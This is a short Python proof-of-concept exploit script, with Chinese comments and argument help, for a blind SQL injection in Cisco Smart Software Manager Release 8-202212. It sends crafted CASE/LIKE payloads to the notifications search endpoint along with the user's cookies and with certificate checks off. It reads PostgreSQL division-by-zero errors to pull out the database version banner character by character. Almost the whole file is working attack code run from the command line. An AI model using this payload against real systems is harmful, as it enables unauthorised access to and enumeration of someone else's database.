import argparse
import requests
import string
import warnings


class Vulnerability:
    def __init__(self, target, cookies):
        self.target = target
        self.cookies = cookies
        self.chars = string.printable[0:95]
        self.result = []
        self.search = True

    def check(self):
        """
        在这里执行检查任务
        """
        print("[+] Cisco Smart Software Manager Release 8-202212 SQL Injection PoC")
        print("[+] Starting DBMS banner enumeration...")

    def exploit(self):
        """
        在这里执行利用任务
        """
        while self.search:
            for char in self.chars:
                url = "https://" + self.target + "/backend/notifications/search_account_notifications.json?filter_by=message_type))%20LIKE%20%27%25%27+OR+1+%3d+1/+(SELECT+CASE+WHEN+(select+version()+LIKE+'" + ''.join(
                    self.result) + char + "%25')+THEN+0+ELSE+1+END)--%20&filter_val=a&offset=0&limit=10"
                # disable invalid cert warnings
                with warnings.catch_warnings():
                    warnings.simplefilter("ignore")
                    r = requests.get(url, headers={"Accept": "application/json", "Content-Type": "application/json"},
                                     cookies=self.cookies, verify=False)
                if "PG::DivisionByZero" in r.text:
                    # update and print result
                    self.result.append(char)
                    print("[+] DBMS Banner: " + ''.join(self.result))
                    break
                if char == " ":
                    # stop search if no match found
                    self.search = False


def parse_arguments():
    parser = argparse.ArgumentParser(description="对目标进行漏洞检测和利用")
    parser.add_argument("-t", "--target", help="目标的URL或IP地址")
    parser.add_argument("-c", "--cookies", help="用户的cookies")
    parser.add_argument("-k", "--check", action="store_true", help="仅进行漏洞检查")
    parser.add_argument("-e", "--exploit", action="store_true", help="执行漏洞利用")
    return parser.parse_args()


def main():
    args = parse_arguments()
    vuln = Vulnerability(args.target, args.cookies)

    if args.check:
        vuln.check()

    if args.exploit:
        vuln.exploit()


if __name__ == "__main__":
    main()
